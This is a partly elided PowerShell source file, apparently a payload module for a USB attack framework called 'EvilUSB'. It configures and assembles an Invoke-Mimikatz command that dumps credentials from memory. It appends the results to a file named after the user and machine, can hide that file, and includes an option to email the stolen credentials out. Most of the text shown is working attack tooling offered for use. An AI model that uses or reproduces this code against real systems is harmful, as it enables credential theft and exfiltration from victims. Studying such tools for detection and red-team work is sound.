...
Function Main {
	$PayloadInfo = New-Object PSObject -Property @{
		Name = 'Invoke-Mimikatz' # for the sake of convenience use the same name than the script for the module
		Author = '@H3ll0World'
		Description = "Reflectively loads Mimikatz 2.0 in memory using PowerShell.`nCan be used to dump credentials without writing anything to the disk.`nCan be used for any functionality provided with Mimikatz."
		Link = "https://github.com/H3LL0WORLD/Powershell/blob/master/Exfiltration/Invoke-Mimikatz.ps1`nhttps://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1"
		'System Required' = 'True' # The payload can be runned on the SYSTEM user context or shouldn't to 
	}
	$ShowInfo = {
	...
	$Options = @{
		...
		'Parameters' = New-Object PSObject -Property @{
			'Name' = "Parameters"
			'Description' = "Invoke-Mimikatz parameters."
			'Required' = "True"
			'Value' = '-DumpCreds'
		}
		'OutputFile' = New-Object PSObject -Property @{
			...
			'Required' = "False"
			'Value' = '$PWD\Mimikatz-$([Environment]::UserName)@$([Environment]::MachineName).txt'
		}
		...
		'EmailSubject' = New-Object PSObject -Property @{
			...
			'Required' = "False"
			'Value' = 'Mimikatz-$([Environment]::UserName)@$([Environment]::MachineName)'
		}
	}
...
Function Add-Payload {
	$ModuleSource = Get-Content "$PWD\data\payload_source\Exfiltration\Invoke-Mimikatz.ps1" | Out-String
	
	$Command = '$Creds = Invoke-Mimikatz ' + $Options.Language.Value + ' | Out-String;'
	$Command += '[IO.File]::AppendAllText("' + $Options.OutputFile.Value + '", $Creds);'
	...
	if ($Options.EmailReport.Value -or $Options.EmailReport.Value -eq "true")
	{
		if ($Global:Settings.Email.User -ne "" -and $Global:Settings.Email.Password -ne "")
		{
			...
			#$Command += [String]::Format('Send-Mail -From ''{0}'' -Password ''{1}'' -Key {2} -To ''{3}'' -Subject "{4}" -Body $Creds;', $From, $Password, $Key, $To, $Subject)
	...
	if ($Options.Hide.Value -or $Options.Hide.Value -eq "true")
	{
		...
		EvilUSB:Print 0 "Use 'attrib /s /d -s -r -h <file_path>' to unhide the mimikatz output file."
	}
